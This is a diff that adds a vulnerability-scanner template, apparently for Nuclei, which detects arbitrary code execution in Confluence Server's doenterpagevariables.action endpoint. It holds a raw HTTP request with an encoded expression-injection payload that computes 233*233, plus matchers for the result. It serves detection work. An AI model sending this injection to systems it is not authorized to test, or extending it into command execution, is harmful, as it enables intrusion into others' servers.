@@ -1,0 +1,36 @@
+id: confluence-rce-doenterpagevariables
+
+info:
+  name: Confluence Server Arbitrary Code Execution
+  author: HuanXiong
+  severity: high
+  description: |
+    Confluence Server and Data Center are vulnerable to arbitrary code execution via a specially crafted payload in the doenterpagevariables.action endpoint.
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /pages/doenterpagevariables.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 47
+
+        queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 403
+      - type: word
+        words:
+          - "54289"
+        part: body
